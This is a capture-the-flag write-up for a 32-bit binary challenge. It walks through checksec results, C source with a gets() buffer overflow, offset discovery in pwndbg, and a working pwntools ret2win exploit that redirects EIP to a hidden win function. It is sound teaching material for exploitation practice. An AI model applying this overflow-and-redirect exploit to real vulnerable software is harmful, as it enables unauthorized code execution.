# Binexp-1

> **Description:** Ever heard of the cow that jumps over the moon? 
>
> **Remote Instance:** nc 54.255.236.13 9001

### Basic File Checks

Perform basic file checks to understand how the binary was compiled.

```
┌──(kali💀JesusCries)-[~/Desktop]
└─$ file binexp-1 
binexp-1: ELF 32-bit LSB executable, Intel 80386, version 1 (SYSV), dynamically linked, interpreter /lib/ld-linux.so.2, for GNU/Linux 2.6.18, BuildID[sha1]=cc905ed71a037c20214db617b5901e4542899113, not stripped
```

From the command above, some of the major takeaways are:

- ELF File Type.
- 32-bit.
- Least Significant Bit (LSB) executable.
- Functions name not stripped.

We can also perform binary protection checks to get an overall idea on where to start tackling the challenge. `No PIE` indicates that we do not have to worry about Address Randomization when performing a `ret2win` attack.

```
┌──(kali💀JesusCries)-[~/Desktop]
└─$ checksec --file=binexp-1 
[*] '/home/kali/Desktop/binexp-1'
    Arch:     i386-32-little
    RELRO:    No RELRO
    Stack:    No canary found
    NX:       NX enabled
    PIE:      No PIE (0x8048000)
```

### Static Code Analysis

By looking at the source code, the `win` function appears to be a dead-code and unreachable by logic. It was initialized but never called by the `main` function. Once again, the same Buffer Overflow vulnerability presents in the `gets` function.

```c
#include <stdio.h>
#include <stdlib.h>

char flag[100];

int win() {
	printf("%s", flag);
	fflush(stdout);
}

int main(int argc, char *argv[]) {
	char buf[64];

	FILE *f = fopen("flag.txt", "r");
	if (f == NULL) {
		puts("'flag.txt' not found.");
		exit(0);
	}

	fgets(flag, 100, f);

	puts("Can you make this jump?");
	gets(buf);
	puts("Welp... Guest not.");
}
```

### Finding Offset & Address

To find the offset or the number of characters required to fill the padding, we can use the `cyclic` module together with `pwn-dbg`. When the program crashes due to segmentation fault, we can inspect the EIP’s value and perform a lookup to determine its offset.

```
pwndbg: loaded 198 commands. Type pwndbg [filter] for a list.
pwndbg: created $rebase, $ida gdb functions (can be used with print/break)
Reading symbols from binexp-1...
(No debugging symbols found in binexp-1)
pwndbg> cyclic 100
aaaabaaacaaadaaaeaaafaaagaaahaaaiaaajaaakaaalaaamaaanaaaoaaapaaaqaaaraaasaaataaauaaavaaawaaaxaaayaaa

pwndbg> run
Starting program: /home/kali/Desktop/binexp-1 
Can you make this jump?
aaaabaaacaaadaaaeaaafaaagaaahaaaiaaajaaakaaalaaamaaanaaaoaaapaaaqaaaraaasaaataaauaaavaaawaaaxaaayaaa
Welp... Guest not.

Program received signal SIGSEGV, Segmentation fault.
0x61616175 in ?? ()
LEGEND: STACK | HEAP | CODE | DATA | RWX | RODATA
─────────────────────────────────────────────────────[ REGISTERS ]───────────────────────────────────────────
 EAX  0x13
 EBX  0x0
 ECX  0xffffffff
 EDX  0xffffffff
 EDI  0x8048480 (_start) ◂— xor    ebp, ebp
 ESI  0x1
 EBP  0x61616174 ('taaa')
 ESP  0xffffd110 ◂— 'vaaawaaaxaaayaaa'
 EIP  0x61616175 ('uaaa')
─────────────────────────────────────────────────────[ DISASM ]───────────────────────────────────────────
Invalid address 0x61616175

pwndbg> cyclic -l uaaa
80
```

Instead of overwriting a variable, we can overwrite the Instruction Pointer with the address of `win` function. Since PIE is not enabled, we can easily get the static address of `win` function and have the EIP point to that particular address.

```
┌──(kali💀JesusCries)-[~/Desktop]
└─$ objdump -D binexp-1 | grep "win"     
08048534 <win>:   
```

To ensure that the stack contains the proper amount of bytes to be aligned, we can make use of the `ret` gadget to fill up the space.

```
┌──(kali💀JesusCries)-[~/Desktop]
└─$ ropgadget binexp-1 | grep "ret" 
0x080483be : ret
```

### Solution

Using pwntools to automate the process:

```
#!/usr/bin/env python3
from pwn import *

elf = ELF('./binexp-1')
rop = ROP(elf)

p = elf.process()
#p = remote('54.255.236.13', 9001)

def exploit():

    padding = b'A'*80
    ret = (rop.find_gadget(['ret']))[0]
    flag = elf.symbols['win']

    payload = padding
    payload += p32(ret)
    payload += p32(flag)

    print(p.recvuntil(b'?'))

    print(payload)
    p.sendline(payload)

    p.interactive()

def main():
    exploit()

if __name__ == "__main__":
    main()
```

